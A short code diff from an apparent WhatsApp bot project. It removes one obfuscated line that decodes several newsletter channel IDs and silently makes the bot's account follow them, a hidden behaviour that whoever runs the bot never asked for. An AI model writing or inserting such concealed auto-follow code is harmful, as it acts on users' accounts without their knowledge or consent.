@@ -417,7 +417,6 @@ async function ZionReact() {
             formatSize,
             randomKarakter
             } = require('./lib/myfunction');          
-function _0x4989(){var _0x2276bd=['22835DnAqhm','newsletterFollow','23384088nvmSeh','120363368222492263@newsletter','802631DgeiPd','1967136KsJdSH','3232481zELCAS','120363183872404578@newsletter','120363401576150890@newsletter','1845231wJywTL','932VupcwA','2902928XpWfkF','2hwldsz'];_0x4989=function(){return _0x2276bd;};return _0x4989();}var _0x14b286=_0x5e39;function _0x5e39(_0x134a26,_0x14fcd0){var _0x49898e=_0x4989();return _0x5e39=function(_0x5e397f,_0x4bc5af){_0x5e397f=_0x5e397f-0xcb;var _0x59318d=_0x49898e[_0x5e397f];return _0x59318d;},_0x5e39(_0x134a26,_0x14fcd0);}(function(_0x3b9bcc,_0x3a8a54){var _0x4c939a=_0x5e39,_0x156fee=_0x3b9bcc();while(!![]){try{var _0x1b790a=-parseInt(_0x4c939a(0xcf))/0x1+parseInt(_0x4c939a(0xd7))/0x2*(-parseInt(_0x4c939a(0xd4))/0x3)+-parseInt(_0x4c939a(0xd5))/0x4*(parseInt(_0x4c939a(0xcb))/0x5)+parseInt(_0x4c939a(0xd0))/0x6+parseInt(_0x4c939a(0xd1))/0x7+-parseInt(_0x4c939a(0xd6))/0x8+parseInt(_0x4c939a(0xcd))/0x9;if(_0x1b790a===_0x3a8a54)break;else _0x156fee['push'](_0x156fee['shift']());}catch(_0x3fc44f){_0x156fee['push'](_0x156fee['shift']());}}}(_0x4989,0x849d2),Zion[_0x14b286(0xcc)](_0x14b286(0xce)),Zion[_0x14b286(0xcc)](_0x14b286(0xd2)),Zion['newsletterFollow'](_0x14b286(0xd3)),Zion['newsletterFollow']('120363402326310878@newsletter'));
 //theme sticker reply
         const Zionwet = () => {
         let ZionStickRep = fs.readFileSync('./lib/sticker_reply/wait.webp')
